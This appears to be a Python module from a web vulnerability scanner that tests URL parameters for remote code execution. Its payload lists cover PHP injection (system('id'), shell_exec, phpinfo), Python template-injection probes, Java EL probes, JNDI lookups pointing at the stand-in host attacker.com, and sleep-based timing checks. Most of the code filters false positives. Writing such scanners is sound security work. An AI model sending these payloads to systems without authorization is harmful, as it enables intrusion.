"""
RCE (Remote Code Execution) 检测模块
检测：代码注入、反序列化RCE、表达式注入、文件上传RCE

误报防护 (P5 fix):
- 必须 baseline 对比：无 payload 请求 vs 有 payload 请求
- echo-server 检测：过滤 httpbin 等回显服务
- 输入反射检测：payload 整体出现在响应中 ≠ 代码被执行
"""
import logging
import re
import time
import uuid
from typing import List

from ..base import DetectionModule, ModuleInfo
from ..base import register_module
from ...models import Vulnerability, VulnerabilityType, Severity, Confidence, ScanTarget
from ...core.session import HTTPPool

from .payloads import (
    PYTHON_CODE_INJECTION_PAYLOADS,
    JAVA_EXPRESSION_PAYLOADS,
    TIME_BASED_PAYLOADS,
)

logger = logging.getLogger("wvs.module.rce")


class RCEDetector(DetectionModule):
    """
    RCE检测模块
    
    检测策略：
    1. 代码注入（PHP/Python/Java表达式）
    2. 时间盲测（无回显场景）
    3. 文件上传RCE
    """
    
    @classmethod
    def get_info(cls) -> ModuleInfo:
        return ModuleInfo(
            name="rce",
            description="Remote Code Execution detection (code injection, deserialization, expression injection)",
            author="WVS Team",
            version="1.0.0",
            enabled_by_default=True,
            tags=["rce", "code-injection", "deserialization", "critical"],
        )
    
    async def _scan_impl(self, target: ScanTarget) -> List[Vulnerability]:
        """
        RCE检测主逻辑

        检测策略（P6 增强）：
        1. 快速指纹识别：检测响应头/内容中的技术栈标记
        2. PHP代码注入（回显检测 + 行为特征检测）
        3. Python SSTI/代码注入
        4. Java表达式注入
        5. 时间盲测（兜底）
        """
        vulns: List[Vulnerability] = []

        params = target.params or {}
        if not params:
            return vulns

        test_token = f"RCE_TEST_{uuid.uuid4().hex[:16].upper()}"

        # P6: Fast server fingerprint — skip irrelevant language tests to save requests
        fp = await self._fingerprint_server(target)

        # 1. PHP代码注入检测（回显 + 行为特征）
        if fp.get("php", True):  # default True for backward compat
            php_vulns = await self._detect_php_injection(target, test_token)
            vulns.extend(php_vulns)
            if not php_vulns:
                php_behavior_vulns = await self._detect_php_behavior(target)
                vulns.extend(php_behavior_vulns)

        # 2. Python代码注入/SSTI检测
        if fp.get("python", True):
            py_vulns = await self._detect_python_injection(target, test_token)
            vulns.extend(py_vulns)

        # 3. Java表达式注入检测
        if fp.get("java", True):
            java_vulns = await self._detect_java_expression(target, test_token)
            vulns.extend(java_vulns)

        # 4. 时间盲测（兜底 — 不做语言过滤，因为 SLEEP 是通用方法）
        time_vulns = await self._detect_time_based(target)
        vulns.extend(time_vulns)

        return vulns
    
    async def _fingerprint_server(self, target: ScanTarget) -> dict:
        """
        P6: Fast server fingerprint — one baseline request to detect tech stack.
        Returns dict with php/python/java bool flags — skip irrelevant lang tests.
        """
        fp = {"php": True, "python": True, "java": True}  # default: test all
        try:
            resp = await self._active_session.get(target.url, params=target.params, timeout=10)
            if not resp:
                return fp
            headers = {k.lower(): v for k, v in resp.headers.items()}
            text = resp.text[:5000].lower()

            server = headers.get("server", "")
            x_powered = headers.get("x-powered-by", "")

            # PHP indicators
            php_indicators = [".php", "phpsessid", "x-powered-by: php", "php/"]
            has_php = any(i in server.lower() or i in x_powered.lower() or i in text
                      or "set-cookie" in headers and "phpsessid" in headers.get("set-cookie", "").lower()
                      for i in php_indicators)
            # Python indicators
            python_indicators = ["python", "django", "flask", "jinja", "werkzeug",
                                 "gunicorn", "uvicorn", "tornado", "cherrypy"]
            has_python = any(i in server.lower() or i in x_powered.lower() or i in text
                            for i in python_indicators)
            # Java indicators
            java_indicators = ["jsp", "servlet", "tomcat", "jboss", "jetty",
                              "glassfish", "weblogic", "websphere", "struts", "spring",
                              "jsessionid", ".do", ".action"]
            has_java = any(i in server.lower() or i in x_powered.lower() or i in text
                          or "set-cookie" in headers and "jsessionid" in headers.get("set-cookie", "").lower()
                          for i in java_indicators)

            # If we positively identified some tech, only test those
            if has_php or has_python or has_java:
                fp["php"] = has_php
                fp["python"] = has_python
                fp["java"] = has_java
        except Exception:
            pass
        return fp

    async def _detect_php_injection(
        self,
        target: ScanTarget,
        test_token: str
    ) -> List[Vulnerability]:
        """检测PHP代码注入 — 使用完整 PHP_CODE_INJECTION_PAYLOADS 库 + baseline 对比"""
        vulns: List[Vulnerability] = []
        params = target.params or {}
        if not params:
            return vulns

        # 构建 token 回显 payloads（最快的检测方式）
        echo_payloads = [
            f"<?php echo '{test_token}'; ?>",
            f"echo '{test_token}';",
            f"print('{test_token}');",
            f"<?= '{test_token}'; ?>",
            f"{{echo '{test_token}'}}",
            f";echo '{test_token}';",
            f"|echo '{test_token}';",
            f"`echo '{test_token}'`",
        ]

        for param_name in list(params.keys()):
            # Baseline: 请求原始参数（无 payload），确认页面本身不含 token
            try:
                baseline_resp = await self._active_session.get(
                    target.url, params=params, timeout=10,
                )
            except Exception:
                baseline_resp = None

            baseline_text = baseline_resp.text if baseline_resp else ""
            if test_token in baseline_text:
                continue  # token 已存在于 baseline 中，跳过

            # Phase 1: Token 回显检测（快速验证代码执行）
            for payload in echo_payloads[:5]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload

                    resp = await self._active_session.get(
                        target.url, params=test_params, timeout=10,
                    )
                    resp_text = resp.text

                    if test_token not in resp_text:
                        continue

                    # 过滤 echo-server（httpbin 等回显服务）
                    if self._is_echo_server(target.url, resp_text, payload):
                        logger.debug(f"[RCE] 忽略 echo-server: {target.url}")
                        continue

                    # 过滤输入反射：payload 整体出现在响应中 ≠ 代码被执行
                    if self._is_input_reflection(resp_text, payload, test_token):
                        logger.debug(f"[RCE] 过滤反射: {target.url} — payload reflected verbatim")
                        continue

                    # 过滤 PHP 错误反射：LFI 端点 include() 产生的 PHP 警告 ≠ RCE
                    if self._is_php_error_reflection(resp_text, payload, test_token):
                        logger.debug(f"[RCE] 过滤 PHP 错误反射: {target.url} — token only in PHP error context")
                        continue

                    # 过滤 LFI 上下文：token 可能来自被 LFI 包含的 PHP 文件执行
                    if self._is_lfi_context(resp_text):
                        logger.debug(f"[RCE] LFI context detected — token likely from included file, not direct RCE")
                        continue

                    # P11: 过滤 HTML verbatim-display 反射（token 出现在 <pre>/<code> 等展示区）
                    if self._is_html_display_reflection(resp_text, test_token, payload):
                        logger.debug(f"[RCE] HTML display reflection — token in verbatim/pre context, not code execution")
                        continue

                    # 二次验证：换不同 token 确认
                    verify_token = f"VFY_{uuid.uuid4().hex[:12].upper()}"
                    verify_payload = f"<?php echo '{verify_token}'; ?>"
                    verify_params = dict(params)
                    verify_params[param_name] = verify_payload
                    try:
                        vfy_resp = await self._active_session.get(
                            target.url, params=verify_params, timeout=10,
                        )
                        if verify_token not in vfy_resp.text:
                            continue
                        if self._is_input_reflection(vfy_resp.text, verify_payload, verify_token):
                            continue
                        if self._is_php_error_reflection(vfy_resp.text, verify_payload, verify_token):
                            continue
                    except Exception:
                        continue

                    vulns.append(self._create_vulnerability(
                        target=target,
                        param=param_name,
                        payload=payload,
                        evidence=f"Code execution confirmed: token '{test_token}' echoed (not in baseline, not reflected)",
                        severity=Severity.CRITICAL,
                    ))
                    # 找到一个 RCE 就够了，跳出外层循环
                    return vulns

                except Exception as e:
                    logger.debug(f"PHP injection test failed: {e}")

        return vulns
    
    async def _detect_php_behavior(
        self,
        target: ScanTarget,
    ) -> List[Vulnerability]:
        """
        检测PHP代码注入 — 行为特征法

        使用 phpinfo(), system('id'), eval(), assert() 等 payload，
        检测响应中是否出现对应的行为特征（PHP版本信息、uid=输出等）。
        解决 token 回显法无法覆盖的 eval/assert/system 等无 token 场景。
        """
        vulns: List[Vulnerability] = []
        params = target.params or {}
        if not params:
            return vulns

        # 从 payloads.py 提取可检测行为特征的 payload
        behavior_payloads = [
            "phpinfo()",
            ";phpinfo();",
            "|phpinfo()",
            "system('id')",
            ";system('id');",
            "exec('id')",
            "shell_exec('id')",
            "eval('phpinfo();')",
            "assert(phpinfo())",
            "call_user_func('phpinfo')",
            "create_function('','phpinfo()')",
            "preg_replace('/.*/e','phpinfo()','test')",
        ]

        for param_name in list(params.keys()):
            # P8: Baseline — check phpinfo indicators aren't already present without injection
            baseline_text = ""
            try:
                baseline_resp = await self._active_session.get(
                    target.url, params=params, timeout=10,
                )
                baseline_text = baseline_resp.text[:10000] if baseline_resp else ""
            except Exception:
                pass

            phpinfo_indicators = [
                "PHP Version",
                "phpinfo()",
                "PHP License",
                "Configuration File (php.ini) Path",
                "PHP Core",
                "Registered PHP Streams",
                "Zend Engine",
                "Configure Command",
            ]
            baseline_score = sum(1 for ind in phpinfo_indicators if ind in baseline_text)
            if baseline_score >= 3:
                continue  # phpinfo output already present without injection

            for payload in behavior_payloads[:6]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload

                    resp = await self._active_session.get(
                        target.url, params=test_params, timeout=10,
                    )
                    resp_text = resp.text[:10000]

                    phpinfo_score = sum(1 for ind in phpinfo_indicators if ind in resp_text)
                    if phpinfo_score >= 5 and phpinfo_score > baseline_score + 2:
                        vulns.append(self._create_vulnerability(
                            target=target,
                            param=param_name,
                            payload=payload,
                            evidence=f"phpinfo() output detected ({phpinfo_score} indicators, baseline={baseline_score}): PHP version info exposed in response",
                            severity=Severity.CRITICAL,
                        ))
                        return vulns

                    # 检测 system('id') 输出特征
                    uid_patterns = [
                        r"uid=\d+\([^)]+\)\s+gid=\d+",
                        r"uid=\d+\([^)]+\)",
                    ]
                    for pat in uid_patterns:
                        if re.search(pat, resp_text):
                            vulns.append(self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=f"system('id') output detected: {re.search(pat, resp_text).group(0)}",
                                severity=Severity.CRITICAL,
                            ))
                            return vulns

                    # 检测 eval/assert 间接执行特征（phpinfo 输出）
                    if payload in ("eval('phpinfo();')", "assert(phpinfo())",
                                  "call_user_func('phpinfo')", "create_function('','phpinfo()')",
                                  "preg_replace('/.*/e','phpinfo()','test')"):
                        if phpinfo_score >= 4 and phpinfo_score > baseline_score + 2:
                            vulns.append(self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=f"Indirect code execution via {payload}: PHP info exposed (score={phpinfo_score}, baseline={baseline_score})",
                                severity=Severity.CRITICAL,
                            ))
                            return vulns

                except Exception as e:
                    logger.debug(f"PHP behavior test failed: {e}")

        return vulns

    async def _detect_python_injection(
        self,
        target: ScanTarget,
        test_token: str
    ) -> List[Vulnerability]:
        """检测Python代码注入/SSTI — 使用完整 PYTHON_CODE_INJECTION_PAYLOADS 库"""
        vulns: List[Vulnerability] = []
        params = target.params or {}

        # SSTI 快速检测 payloads（数学运算 + 回显）
        ssti_payloads = [
            ("{{7*7}}", "49", "SSTI detected: {{7*7}} evaluated to 49"),
            ("${7*7}", "49", "Mako SSTI: ${7*7} evaluated to 49"),
            ("#{7*7}", "49", "SpEL: #{7*7} evaluated to 49"),
            (f"{{{{'{test_token}'}}}}", test_token, f"SSTI token echo: '{test_token}' reflected"),
            (f"${{{test_token}}}", test_token, f"Mako token echo: ${{{test_token}}}"),
            ("{{config}}", None, "SSTI config object leaked"),
            ("{{''.__class__.__mro__[2].__subclasses__()}}", "__subclasses__", "SSTI: __mro__/__subclasses__ exposed"),
            ("{{request.application.__globals__.__builtins__}}", "__builtins__", "SSTI: __builtins__ leaked"),
        ]

        # 追加 payloads.py 中的行为特征 payload
        for py_payload in PYTHON_CODE_INJECTION_PAYLOADS:
            if "system" in py_payload and py_payload not in [p[0] for p in ssti_payloads]:
                ssti_payloads.append((py_payload, None, f"Python code injection: {py_payload[:60]}"))

        # P8: Baseline — avoid matching content already present without injection
        baseline_text = ""
        try:
            baseline_resp = await self._active_session.get(
                target.url, params=params, timeout=10,
            )
            baseline_text = baseline_resp.text[:10000] if baseline_resp else ""
        except Exception:
            pass

        for param_name, param_value in params.items():
            for payload, expected, evidence_base in ssti_payloads[:12]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload

                    resp = await self._active_session.get(
                        target.url,
                        params=test_params,
                        timeout=10,
                    )

                    # P8: Check expected output with baseline comparison
                    if expected and expected in resp.text:
                        # Baseline check: if expected value already exists without injection → FP
                        if expected in baseline_text and expected == "49":
                            continue  # "49" already in baseline (page number, ID, etc.)
                        vulns.append(self._create_vulnerability(
                            target=target,
                            param=param_name,
                            payload=payload,
                            evidence=evidence_base,
                            severity=Severity.CRITICAL,
                        ))
                        return vulns

                    # 回显检测
                    if test_token in resp.text and not self._is_input_reflection(resp.text, payload, test_token):
                        vulns.append(self._create_vulnerability(
                            target=target,
                            param=param_name,
                            payload=payload,
                            evidence=f"Token '{test_token}' found in response (Python/SSTI injection)",
                            severity=Severity.CRITICAL,
                        ))
                        return vulns

                    # 检查 SSTI 泄露特征（__subclasses__, __globals__, __builtins__）
                    ssti_leak_indicators = [
                        "__subclasses__", "__globals__", "__builtins__",
                        "__mro__", "__bases__", "__class__",
                    ]
                    for indicator in ssti_leak_indicators:
                        if indicator in resp.text and indicator in payload:
                            vulns.append(self._create_vulnerability(
                                target=target,
                                param=param_name,
                                payload=payload,
                                evidence=f"SSTI object leaked: {indicator} exposed in response",
                                severity=Severity.CRITICAL,
                            ))
                            return vulns

                except Exception as e:
                    logger.debug(f"Python injection test failed: {e}")

        return vulns
    
    async def _detect_java_expression(
        self,
        target: ScanTarget,
        test_token: str
    ) -> List[Vulnerability]:
        """检测Java表达式注入（EL/OGNL/SpEL）— 使用完整 JAVA_EXPRESSION_PAYLOADS 库"""
        vulns: List[Vulnerability] = []
        params = target.params or {}

        java_payloads = [
            # EL 数学运算（最快速检测）
            ("${7*7}", "49", "EL expression: ${7*7} evaluated to 49"),
            ("#{7*7}", "49", "SpEL: #{7*7} evaluated to 49"),
            # EL 上下文泄露
            ("${applicationScope}", "ServletContext", "EL context leak: applicationScope exposed"),
            ("${pageContext}", "ServletContext", "EL context leak: pageContext exposed"),
            # JNDI 注入
            ("${jndi:ldap://attacker.com/exploit}", None, "JNDI injection probe"),
            ("${jndi:rmi://attacker.com/exploit}", None, "JNDI RMI injection probe"),
            # Runtime.exec 探测
            ("${Runtime.getRuntime().exec('id')}", "uid=", "EL RCE: Runtime.exec('id') output detected"),
        ]

        # 追加 payloads.py 中的 OGNL/SpEL payload
        for java_payload in JAVA_EXPRESSION_PAYLOADS:
            if java_payload not in [p[0] for p in java_payloads]:
                java_payloads.append((java_payload, None, f"Java expression: {java_payload[:60]}"))

        # P8: Baseline — avoid matching content already present without injection
        baseline_text = ""
        try:
            baseline_resp = await self._active_session.get(
                target.url, params=params, timeout=10,
            )
            baseline_text = baseline_resp.text[:10000] if baseline_resp else ""
        except Exception:
            pass

        for param_name, param_value in params.items():
            for payload, expected, evidence_base in java_payloads[:10]:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload

                    resp = await self._active_session.get(
                        target.url,
                        params=test_params,
                        timeout=10,
                    )
                    resp_text = resp.text[:10000]

                    # 表达式数学运算结果检测
                    if expected and expected in resp_text and expected != "49":
                        # P8: Baseline check — if indicator exists without injection, it's not RCE
                        if expected in baseline_text:
                            continue
                        vulns.append(self._create_vulnerability(
                            target=target,
                            param=param_name,
                            payload=payload,
                            evidence=evidence_base,
                            severity=Severity.CRITICAL if "exec" in payload else Severity.HIGH,
                        ))
                        return vulns
                    elif expected == "49" and re.search(r'\b49\b', resp_text):
                        # P8: Baseline check — "49" may be page number, ID, year, etc.
                        if re.search(r'\b49\b', baseline_text):
                            continue
                        vulns.append(self._create_vulnerability(
                            target=target,
                            param=param_name,
                            payload=payload,
                            evidence=evidence_base,
                            severity=Severity.CRITICAL,
                        ))
                        return vulns

                    # P8: EL/OGNL/SpEL 上下文泄露检测 — require baseline absent + multi-indicator
                    el_leak_indicators = [
                        "ServletContext", "applicationScope", "pageContext",
                        "javax.servlet", "org.apache", "java.lang.Runtime",
                        "ProcessBuilder", "org.springframework",
                    ]
                    el_leak_count = 0
                    first_indicator = None
                    for indicator in el_leak_indicators:
                        if indicator in resp_text and indicator not in baseline_text:
                            el_leak_count += 1
                            if first_indicator is None:
                                first_indicator = indicator
                    if el_leak_count >= 2:
                        vulns.append(self._create_vulnerability(
                            target=target,
                            param=param_name,
                            payload=payload,
                            evidence=f"Java EL leak: {el_leak_count} indicators exposed ({first_indicator}...) — payload: {payload[:50]}",
                            severity=Severity.HIGH,
                        ))
                        return vulns

                except Exception as e:
                    logger.debug(f"Java expression test failed: {e}")

        return vulns
    
    async def _detect_time_based(self, target: ScanTarget) -> List[Vulnerability]:
        """时间盲测（无回显场景）— 使用 TIME_BASED_PAYLOADS + baseline 测量"""
        vulns: List[Vulnerability] = []
        params = target.params or {}
        if not params:
            return vulns

        for param_name, param_value in params.items():
            # 测量基线响应时间
            baseline_avg, baseline_std = await self._measure_baseline(
                "GET", target.url, params, "query",
            )
            if self._should_skip_time_based(baseline_avg, baseline_std):
                continue

            for lang, payloads in TIME_BASED_PAYLOADS.items():
                for payload in payloads[:2]:
                    try:
                        test_params = dict(params)
                        test_params[param_name] = payload

                        start = time.monotonic()
                        resp = await self._active_session.get(
                            target.url,
                            params=test_params,
                            timeout=20,
                        )
                        elapsed = time.monotonic() - start

                        # 解析预期延迟（sleep(3) → 3, sleep(5) → 5, timeout 5 → 5）
                        expected_delay = 3
                        import re as _re
                        delay_match = _re.search(r'sleep\s*\(?\s*(\d+)', payload)
                        if delay_match:
                            expected_delay = int(delay_match.group(1))

                        if resp and self._is_valid_time_delay(elapsed, expected_delay, baseline_avg):
                            verify_payloads = [
                                p for plist in TIME_BASED_PAYLOADS.values()
                                for p in plist[:2]
                                if f"sleep({expected_delay})" in p or f"sleep {expected_delay}" in p
                            ][:3]
                            if not verify_payloads:
                                verify_payloads = [
                                    f"sleep({expected_delay})",
                                    f";sleep({expected_delay});",
                                    f"`sleep {expected_delay}`",
                                ]

                            if await self._verify_time_based(
                                target.url, params, param_name, "GET", "query",
                                expected_delay, baseline_avg, verify_payloads,
                            ):
                                vulns.append(self._create_vulnerability(
                                    target=target,
                                    param=param_name,
                                    payload=payload,
                                    evidence=f"Time-based RCE ({lang}): response delayed {elapsed:.2f}s (baseline={baseline_avg:.2f}s, expected ~{expected_delay}s)",
                                    severity=Severity.HIGH,
                                    confidence=Confidence.MEDIUM,
                                ))
                                return vulns

                    except Exception as e:
                        logger.debug(f"Time-based test failed: {e}")

        return vulns
    
    def _is_input_reflection(self, resp_text: str, payload: str, token: str) -> bool:
        """
        检测是否为输入反射（payload 被原样回显），而非代码执行。
        真实 RCE：响应中只出现 token（代码执行了，echo 输出了 token）
        误报：响应中出现了完整 payload，移除 payload 后 token 也不见了

        注意：必须移除 ALL 次出现的 payload，因为 PHP include() 错误
        会在警告消息中反射 payload 两次（函数参数 + 错误描述字符串），
        只移除一次会导致 token 残留在第二次出现中。
        """
        if payload in resp_text:
            stripped = resp_text.replace(payload, "")
            if token not in stripped:
                return True
        # P11: Also detect when token appears ONLY inside the reflected payload text
        # e.g. HTML page shows "You entered: <?php echo 'TOKEN'; ?>" — token is inside
        # the reflected payload, not independently echoed by code execution
        if token in resp_text:
            # Find all positions of token in response
            import re as _re
            token_positions = [m.start() for m in _re.finditer(_re.escape(token), resp_text)]
            payload_positions = [m.start() for m in _re.finditer(_re.escape(payload), resp_text)]
            # If every token occurrence falls within a payload reflection, it's FP
            all_inside_reflection = True
            for tp in token_positions:
                inside = any(pp <= tp < pp + len(payload) for pp in payload_positions)
                if not inside:
                    all_inside_reflection = False
                    break
            if all_inside_reflection and payload_positions:
                return True
        return False

    def _is_php_error_reflection(self, resp_text: str, payload: str, token: str) -> bool:
        """
        检测 token 是否仅出现在 PHP 错误/警告上下文中（LFI 端点误报）。

        当 LFI 端点使用 include()/require() 时，注入的 RCE payload 会被
        PHP 作为文件名处理，产生类似以下警告：
          Warning: include(echo 'TOKEN';): failed to open stream ...
        这种响应不表示代码被执行，只是 PHP 错误信息反映了输入。

        同时支持纯文本和 HTML 格式化（<b>Warning</b>:）的 PHP 错误消息。
        P11: 增加 PHP 5.x 旧版错误格式支持 (Metasploitable2 场景)。
        """
        # 快速检查：响应中有 PHP 错误特征吗？
        quick_checks = [
            r"Warning[<\s:]",       # "Warning:", "<b>Warning</b>:"
            r"Fatal error[<\s:]",
            r"Notice[<\s:]",
            r"failed to open stream",
            r"failed opening.*for inclusion",
            # P11: PHP 5.x / Metasploitable2 specific error formats
            r"failed to open stream:",
            r"No such file or directory in",
            r"on line\s+\d+",
            r"\.php</b> on line",
        ]
        if not any(re.search(p, resp_text, re.IGNORECASE) for p in quick_checks):
            return False

        # 确认是 include/require 导致的文件操作错误（而非其他 PHP 错误）
        php_func_error = (
            re.search(r"include\s*\(.*\)", resp_text, re.IGNORECASE) or
            re.search(r"require\s*\(.*\)", resp_text, re.IGNORECASE) or
            re.search(r"file_get_contents\s*\(.*\)", resp_text, re.IGNORECASE)
        )
        php_stream_error = re.search(r"failed to open stream|failed opening", resp_text, re.IGNORECASE)
        # P11: Also detect when PHP error line contains the payload/token as filename
        php_error_with_payload = (
            re.search(r'failed to open stream:.*' + re.escape(payload[:30]), resp_text, re.IGNORECASE) or
            re.search(r'failed to open stream:.*' + re.escape(token[:16]), resp_text, re.IGNORECASE)
        )
        if not (php_func_error or php_stream_error or php_error_with_payload):
            return False

        # 移除所有 PHP 错误行后，检查 token 是否仍存在
        error_line_patterns = [
            r"Warning[<\s:]", r"Fatal error[<\s:]", r"Notice[<\s:]",
            r"failed to open stream", r"failed opening",
            r"on line \d+", r"in <b>", r"\.php</b> on line",
            r"No such file or directory", r"include_path=",
        ]
        lines = resp_text.split('\n')
        non_error_lines = [
            l for l in lines
            if not any(re.search(p, l, re.IGNORECASE) for p in error_line_patterns)
        ]
        non_error_text = '\n'.join(non_error_lines)

        if token in resp_text and token not in non_error_text:
            return True

        return False

    def _is_html_display_reflection(self, resp_text: str, token: str, payload: str) -> bool:
        """
        P11: Detect when token only appears in HTML verbatim-display context.

        Some apps echo user input verbatim inside <pre>, <code>, <textarea>,
        or as plaintext debug output. The token appearing there does NOT
        indicate code execution — it's just reflection.

        Returns True if token ONLY exists inside verbatim-display HTML contexts.
        """
        # Extract all token occurrences and their surrounding context
        import re as _re
        verbatim_tags = ['pre', 'code', 'textarea', 'samp', 'kbd', 'xmp']
        tag_pattern = '|'.join(verbatim_tags)

        token_positions = [m.start() for m in _re.finditer(_re.escape(token), resp_text)]
        if not token_positions:
            return False

        all_in_verbatim = True
        for pos in token_positions:
            context_before = resp_text[max(0, pos - 500):pos]
            # Check if token is inside a verbatim tag
            in_verbatim = False
            for tag in verbatim_tags:
                open_tag = f'<{tag}'
                close_tag = f'</{tag}>'
                last_open = context_before.rfind(open_tag)
                last_close = context_before.rfind(close_tag)
                if last_open > last_close:
                    in_verbatim = True
                    break
            # Also check if token is in a "debug output" context
            debug_markers = ["Your input:", "You entered:", "Input was:",
                           "Echo:", "Output:", "Result:", "Value:"]
            if any(m in context_before[-200:] for m in debug_markers):
                in_verbatim = True
            if not in_verbatim:
                all_in_verbatim = False
                break

        return all_in_verbatim

    def _is_lfi_context(self, resp_text: str) -> bool:
        """
        检测响应中是否包含 LFI 文件内容特征，说明 token 可能是通过
        LFI 包含 PHP 文件后执行得到的，而非直接 RCE。

        当响应中同时出现文件系统内容（/etc/passwd, /proc/self/environ,
        win.ini 等）时，说明存在文件包含行为，token 执行是 LFI 的副作用。
        """
        lfi_indicators = [
            "root:x:0:0:", "nobody:x:", "daemon:x:",  # /etc/passwd
            "[fonts]", "[extensions]", "[Mail]",  # win.ini
            "PATH=", "HOME=", "USER=", "SHELL=",  # /proc/self/environ
            "Pid:", "Name:", "Uid:",  # /proc/self/status
            "[boot loader]", "default=",  # boot.ini
        ]
        score = sum(1 for ind in lfi_indicators if ind in resp_text)
        return score >= 2

    def _is_echo_server(self, url: str, resp_text: str, payload: str) -> bool:
        """检测目标是否为 echo-server（如 httpbin.org），避免反射型误报。"""
        json_indicators = ['"args"', '"url"', '"headers"', '"origin"', '"form"']
        json_score = sum(1 for ind in json_indicators if ind in resp_text)
        if json_score >= 2:
            import re as _re
            quoted = _re.escape(payload)
            if _re.search(f'"[^"]*{quoted}[^"]*"', resp_text):
                return True
        debug_indicators = ["Request Details", "Query String Parameters",
                           "Your Input:", "You entered:", "Debug Information"]
        if any(ind in resp_text for ind in debug_indicators):
            if payload in resp_text:
                return True
        return False

    def _create_vulnerability(
        self,
        target: ScanTarget,
        param: str,
        payload: str,
        evidence: str,
        severity: Severity = Severity.HIGH,
        confidence: Confidence = Confidence.HIGH,
    ) -> Vulnerability:
        """创建漏洞对象 — 委托基类 _create_vuln 确保类型映射统一"""
        return self._create_vuln(
            url=target.url,
            param=param,
            param_type=target.params and "query" or "body",
            method="GET",
            payload=payload,
            vuln_type="token_echo" if "token" in evidence.lower() else "code_execution",
            severity=severity,
            confidence=confidence,
            evidence=evidence,
            description="Remote code execution vulnerability allows attackers to execute arbitrary code on the server.",
            recommendation=(
                "Avoid using eval(), exec(), system() functions with user input. "
                "Use allowlists for acceptable input. "
                "Implement strict input validation and sanitization."
            ),
            context={
                "references": [
                    "https://owasp.org/www-community/attacks/Code_Injection",
                    "https://portswigger.net/web-security/os-command-injection",
                ],
            },
        )


# 注册模块
register_module(RCEDetector)
